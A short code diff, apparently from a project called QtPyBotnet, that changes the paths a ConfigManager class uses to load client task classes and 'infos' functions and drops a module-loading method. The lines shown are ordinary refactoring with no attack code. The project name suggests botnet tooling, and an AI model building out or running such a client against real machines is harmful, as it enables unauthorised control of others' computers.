@@ -50,15 +50,11 @@ class ConfigManager(QObject):
 
     @staticmethod
     def get_tasks():
-        return get_subclassess_by_name("QtPyBotnet/client/tasks", "tasks.__task.Task")
-
-    @staticmethod
-    def get_modules():
-        return get_subclassess_by_name("QtPyBotnet/client/modules", "modules.Module")
+        return get_subclassess_by_name("./client/tasks", "tasks.__task.Task")
 
     @staticmethod
     def get_infos():
-        return function_importer("./client/modules/utils.py")
+        return function_importer("./client/", "infos")
 
     def create(self, config, key: str):
         try:
